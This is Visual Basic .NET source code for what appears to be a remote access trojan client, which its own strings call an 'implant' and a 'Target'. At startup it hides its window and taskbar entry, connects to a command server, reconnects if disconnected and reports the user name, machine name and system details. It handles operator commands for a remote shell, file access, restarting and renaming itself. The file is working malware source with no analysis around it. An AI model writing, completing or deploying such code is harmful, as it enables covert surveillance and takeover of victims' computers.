Public Class Form1
#Region "F"
    Public WithEvents C As New SocketClient
    Public Yy As String = "||"
    Public H As String = "localhost"
    Public Ping As Integer = 0
    Public P As Integer = 6666
    Public ind As String = ""
    Public spw As String = "Pa$$word"
    Public Id As String = "Target_000"
    Public nK As String = "No Implant Name"
    Public Vv As String = "0.0.0.1"
    Public uT As String = ""
    Public CN As String = ""
    Public Et As String = ""
#End Region
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        CheckForIllegalCrossThreadCalls = False
        Me.FormBorderStyle = Windows.Forms.FormBorderStyle.None
        Me.ShowInTaskbar = False
        Me.Hide()
        Me.Visible = False
        Cdat()
        C.Connect(H, P)
        uT = Now()
    End Sub
    Private Sub PP()
        Try
            png.Start()
            C.Send("pp" & Yy & "-")
        Catch ex As Exception
#If DEBUG Then
            Console.WriteLine(ex.Message)
#End If
        End Try
    End Sub
    Private Sub UP_D()
        Try
            PP()
            C.Send("~" & Yy & uT & Yy & ind & Yy & Id & Yy & GOS() & Yy & Environment.UserName & Yy & Environment.MachineName & Yy & Ping.ToString() & " ms" & Yy & Vv & Yy & GAW())
        Catch ex As Exception
            Console.WriteLine(ex.Message)
        End Try
    End Sub
    Private Sub png_Tick(sender As Object, e As EventArgs) Handles png.Tick
        Me.Ping = Me.Ping + 1
    End Sub

#Region "S"
    Private Sub Connected() Handles C.Connected
        png.Start()
        CN = Now()
    End Sub
    Private Sub Disconnected() Handles C.Disconnected
        C.Connect(H, P)
    End Sub
    Private Sub Data(ByVal b As Byte()) Handles C.Data
        Dim T As String = BS(b)
        Dim A As String() = Split(T, Yy)
        Try
            Console.WriteLine("DEBUG : " + A(0) + "," + A(1))
        Catch ex As Exception
        End Try
        Try
            Select Case A(0)
#Region "BP"
                Case "pp"
                    png.Stop()
                Case "~"
                    If A(1) = spw Then
                        UP_D()
                    Else
                        'Send Remote Error
                        End
                    End If
                Case "Ex"
                    Select Case A(1)
                        Case "!"
                            C.Send("Ex" & Yy & "!" & Yy & Id & Yy & nK & Yy & Vv & Yy & uT & Yy & GOS() & Yy & GetSystemUpTimeInfo() & Yy & Environment.GetFolderPath(Environment.SpecialFolder.System) & Yy & Is64() & Yy & Environment.ProcessorCount.ToString() & Yy & CN & Yy & Ping.ToString())
                        Case "-"
                            C.DisConnect()
                        Case "--"
                            End
                        Case "?"
                            C.Send("Ex" & Yy & "?" & Yy & uT)
                        Case "+"
                            Id = A(2)
                            nK = A(3)
                            C.Send("Ex" & Yy & "R")
                    End Select
                Case "#"
                    Select Case A(1)
                        Case "!"
                            If smethod_c(C) Then
                                C.Send("#" & Yy & "!")
                            End If
                        Case "?"
                            WriteRS(A(2))
                        Case "!!"
                            CloseRS()
                    End Select
                Case "$"
                    Select Case A(1)
                        Case "!"
                            smethod_2(C)
                        Case "=!"
                            Try
                                Dim r As String = smethod_3(A(2))
                                Dim f As String = smethod_4(A(2))
                                If r = "un" Or f = "un" Then
                                    C.Send("$" & Yy & "=!" & Yy & "Error" & Yy & "Unhauthorized access.")
                                Else
                                    C.Send("$" & Yy & "=!" & Yy & r & f)
                                End If
                            Catch ex As Exception
                                C.Send("$" & Yy & "=!" & Yy & "Error" & Yy & ex.Message)
                            End Try
                        Case "vi"
                            Try
                                smethod_5(C, A(2))
                            Catch ex As Exception
                                C.Send("$" & Yy & "vi" & Yy & "Error" & Yy & ex.Message)
                            End Try
                    End Select
                Case "SCU"
                    C.Send("SCU" & Yy & Id & Yy & GAW() & Yy & Ping.ToString())
                Case "rbt"
                    Application.Restart()
                Case "RNM"
                    Try
                        Rename(Application.ExecutablePath, Application.StartupPath & "\" & A(1) & ".exe")
                    Catch ex As Exception
                        'Send Error
                    End Try
                Case "close"
                    End
#End Region
            End Select
        Catch ex As Exception
        End Try
    End Sub

    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        End
    End Sub


#End Region
End Class
